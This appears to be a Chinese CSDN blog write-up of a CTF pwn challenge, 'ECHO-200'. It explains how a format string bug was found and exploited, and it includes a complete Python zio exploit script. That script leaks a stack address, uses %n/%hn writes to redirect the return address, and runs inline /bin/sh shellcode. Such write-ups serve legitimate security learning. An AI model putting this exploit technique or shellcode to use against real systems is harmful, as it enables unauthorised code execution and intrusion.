@@ -1,0 +1,185 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   CTF-ECHO-200格式化字符串漏洞+shellcode
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年06月01日 13:20:41
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：561
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <div class="markdown_views">
+    <p>
+     很开心有成功做了一道格式化字符串，这题我也不清楚是哪次比赛上的，漏洞还是十分的明显，格式化加个shellcode直接搞定。就是这算的比较麻烦一点。
+     <br/>
+     那么直接进入正题咯！
+     <br/>
+     开干！！
+     <br/>
+     首先拿checksec检查一遍(个人习惯哈)
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170601131734325?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     可以看到，开了栈保护，但是NX disabled，说明堆栈可执行，直接上shellcode，也没有PIE。
+     <br/>
+     先试试水。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170601131748733?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     应该有格式化漏洞。
+     <br/>
+     IDA反汇编。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170601131800702?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     格式化字符串漏洞不要太明显了呢。但是我们一次只能写入16个字节，这咋写shellcode丫。调试的时候发现。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170601131839748?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     BFCBB324的值是由BFCBB330传来的，而且BFCBB350在整个循环中没有改变，那我们就可以先通过16字节泄露出一个地址，从而来确定栈的相对位置，在来更改BFCBB330的值，从而获取更大的漏洞的利用空间，
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170601131848983?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     可以看下这段代码。1FF也就是511，也就是最多可以利用511字节。这对于我们来说足够了。那么拿到栈的相对位置之后，我们就可以确定返回地址，以及各种我们想要的栈地址，
+     <br/>
+     这里在算shellcode的相对位置时会比较麻烦，还要考虑下字节补足。
+     <br/>
+     具体的调试过程我就不再过多的写了，对于这种题目找到漏洞后有一个利用思路就足够了，剩下的就是慢慢的调试。
+     <br/>
+     贴上代码：
+    </p>
+    <pre class="prettyprint"><code class=" hljs perl">from zio import *
+import struct 
+target=(<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-number">10000</span>)
+io = zio(target, timeout=<span class="hljs-number">10000</span>, print_read=COLORED(RAW, <span class="hljs-string">'red'</span>), print_write=COLORED(RAW, <span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">'go1?'</span>)
+
+io.read_until(<span class="hljs-string">"16"</span>)
+payload=<span class="hljs-string">'%12$ud'</span>
+io.writeline(payload)
+test=io.read_until(<span class="hljs-string">'16'</span>)
+stack=<span class="hljs-keyword">int</span>(test[<span class="hljs-number">7</span>:<span class="hljs-number">17</span>],<span class="hljs-number">10</span>)
+size=stack-<span class="hljs-number">0x7a</span>
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(size)
+payload=l32(size)
+payload+=<span class="hljs-string">'%999d'</span>  <span class="hljs-comment">#write stack 99</span>
+payload+=<span class="hljs-string">'%7$n'</span>
+io.writeline(payload)
+io.read_until(<span class="hljs-string">'Reading 511 bytes'</span>) <span class="hljs-comment">#write shellcode</span>
+tiaozhuan=size+<span class="hljs-number">0x8</span>
+ret=size+<span class="hljs-number">0x21c</span>
+shell_addr=size+<span class="hljs-number">0x3c</span>
+shell=<span class="hljs-string">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1'</span>+<span class="hljs-string">'\x40'</span><span class="hljs-variable">*11</span>+<span class="hljs-string">'\x31\xd2\xcd\x80'</span>
+<span class="hljs-keyword">s</span>=len(shell)
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(tiaozhuan)
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(ret)
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">s</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(shell_addr)
+len1=(shell_addr &amp; <span class="hljs-number">0x0000ffff</span>) -<span class="hljs-number">0x16</span> -<span class="hljs-number">0x6</span>   <span class="hljs-comment">#di 4 wei</span>
+len2=(shell_addr &gt;&gt; <span class="hljs-number">16</span>) - (shell_addr &amp; <span class="hljs-number">0x0000ffff</span>)    <span class="hljs-comment">#gao 4 wei</span>
+payload=l32(tiaozhuan)+l32(ret)+l32(ret+<span class="hljs-number">0x2</span>)
+payload+=<span class="hljs-string">'%16x'</span>+<span class="hljs-string">'%7$n'</span>
+payload+=<span class="hljs-string">'%'</span>+str(len1)+<span class="hljs-string">'x'</span>+<span class="hljs-string">'%8$hn'</span>
+payload+=<span class="hljs-string">'%'</span>+str(len2)+<span class="hljs-string">'x'</span>+<span class="hljs-string">'%9$hn'</span>
+<span class="hljs-keyword">x</span>=len(str(len1))
+<span class="hljs-keyword">y</span>=len(str(len2))
+<span class="hljs-keyword">print</span> <span class="hljs-string">'x:'</span>+<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">x</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'y:'</span>+<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">y</span>)
+payload+=<span class="hljs-string">'a'</span><span class="hljs-variable">*(</span><span class="hljs-number">6</span>-<span class="hljs-keyword">x</span>)+<span class="hljs-string">'a'</span><span class="hljs-variable">*(</span><span class="hljs-number">6</span>-<span class="hljs-keyword">y</span>+<span class="hljs-number">2</span>) + shell
+io.writeline(payload)
+io.writeline(<span class="hljs-string">'cat flag'</span>)
+io.interact()</code></pre>
+    <p>
+     补充：哎，本来想着差不多写完了。但是想想对于刚接触格式化的小白来说，可能在调试的过程中会碰到许多的问题(至少我就没少遇到。)所以在这里做点补充。
+     <br/>
+     1.如何leak stack的地址。
+     <br/>
+     这其实是个难点，我觉得是。
+    </p>
+    <pre class="prettyprint"><code class=" hljs lua"><span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">"16"</span>)
+payload=<span class="hljs-string">'%12$ud'</span>
+<span class="hljs-built_in">io</span>.writeline(payload)
+test=<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'16'</span>)
+stack=int(test[<span class="hljs-number">7</span>:<span class="hljs-number">17</span>],<span class="hljs-number">10</span>)
+size=stack-<span class="hljs-number">0x7a</span>
+<span class="hljs-built_in">print</span> hex(size)</code></pre>
+    <p>
+     如果对汇编比较了解，那么通过看汇编代码应该能看出来。否则就得细心慢慢找咯，由于栈上的地址通常以
+     <code>
+      0xba123344
+     </code>
+     这种，对应十进制的长度就应该是10位，所以用
+     <code>
+      int(test[7:17],10)
+     </code>
+     ，当然又可以用16进制leak。。不知道有没有讲清楚。汗！
+     <br/>
+     2.另一个点，就是跳出while循环，从反汇编的代码来看，这是个死循环，无法正常跳出。但我们在调试程序的时候发现它是通过一个cmp来进行判断。如图。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170601131931406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     咋办嘞？直接把
+     <code>
+      [esp+18h]
+     </code>
+     给改了就行了。
+     <br/>
+     3.最后一个问题，可能就是如何组织栈了，建议把地址写在前面。可以参考一下我的。
+    </p>
+    <p>
+     完了！
+    </p>
+   </div>
+   <link href="https://csdnimg.cn/release/phoenix/template/css/markdown_views-ea0013b516.css" rel="stylesheet"/>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/72830299
+  </div>
+  <div class="tags-box artic-tag-box">
+   <span class="label">
+    文章标签：
+   </span>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=格式化&amp;t=blog" target="_blank">
+    格式化
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=漏洞&amp;t=blog" target="_blank">
+    漏洞
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=栈&amp;t=blog" target="_blank">
+    栈
+   </a>
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
